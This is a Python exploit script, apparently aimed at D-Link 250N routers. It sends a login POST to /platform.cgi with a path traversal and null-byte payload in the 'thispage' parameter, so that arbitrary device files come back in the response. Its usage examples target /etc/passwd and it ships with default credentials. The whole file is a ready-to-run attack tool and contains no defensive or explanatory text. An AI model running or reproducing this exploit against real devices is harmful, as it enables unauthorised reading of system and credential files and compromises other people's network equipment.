import sys
import pycurl
import certifi
import argparse
try:
	from io import BytesIO
except ImportError:
	from StringIO import StringIO as BytesIO


def header_function(header_line):
	if '200 OK' not in header_line:
		print(header_line.strip())

def attack(hostname,username,password,user_agent,data_to_fetch):

	if 'http' not in hostname and 'https' not in hostname:
		print('[-] You need to provide http or https in hostname')
		print('[-] Exiting...')
		sys.exit(0)


	data = 'thispage=../../../../../../..{}%00index.htm&Users.UserName={}&Users.Password={}&button.login.Users.deviceStatus=Login&Login.userAgent={}'.format(data_to_fetch,username,password,user_agent)

	url = hostname + '/platform.cgi'

	buffer = BytesIO()
	c = pycurl.Curl()
	c.setopt(c.URL,url)
	c.setopt(c.CAINFO,certifi.where())
	c.setopt(c.USERAGENT,user_agent)
	c.setopt(c.WRITEDATA,buffer)
	c.setopt(c.HEADERFUNCTION,header_function)
	c.setopt(c.POSTFIELDS,data)
	c.perform()
	c.close()

def parse():

	example_text = """
Examples:

	$ python d-link.py -i http://127.0.0.1 /etc/passwd
	$ python d-link.py -i https://10.10.10.3 -u admin -p admin /etc/passwd
	$ python d-link.py --ip=http://127.0.0.1 --username=root --password=root /etc/passwd 
	"""

	parser = argparse.ArgumentParser(description='D-LINK-250N LFI-er',
					epilog=example_text,
					formatter_class=argparse.RawDescriptionHelpFormatter)
	parser.add_argument('data',help='What to fetch')
	parser.add_argument('-i','--ip',help='Router IP or hostname',required=True)
	parser.add_argument('-u','--username',help='Username to use(test default)',default='test')
	parser.add_argument('-p','--password',help='Password to use(test default)',default='test')
	parser.add_argument('-ua','--user-agent',help='User agent',default='Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0')
	
	args = parser.parse_args()	
	attack(str(args.ip),str(args.username),str(args.password),str(args.user_agent),str(args.data))

if __name__ == '__main__':
	parse()
